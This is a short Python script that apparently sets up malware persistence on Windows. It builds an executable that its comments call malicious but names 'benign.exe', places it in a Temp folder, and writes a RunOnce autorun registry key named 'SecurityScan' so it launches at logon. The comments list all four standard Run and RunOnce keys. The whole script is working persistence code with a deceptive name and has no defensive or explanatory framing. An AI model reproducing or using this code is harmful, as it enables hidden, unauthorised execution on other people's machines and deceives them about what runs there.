# Import necessary modules for file operations and registry manipulation
import os, shutil, winreg

# Define directory and filename for the executable
filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)

# Check if the file exists and remove it if it does
if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename,filedir)


# Windows default autorun keys:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

regkey = 1 # Set registry key selection value

# Determine the registry hive based on the regkey value
if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE
if (regkey % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"


# Add registry autorun key
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
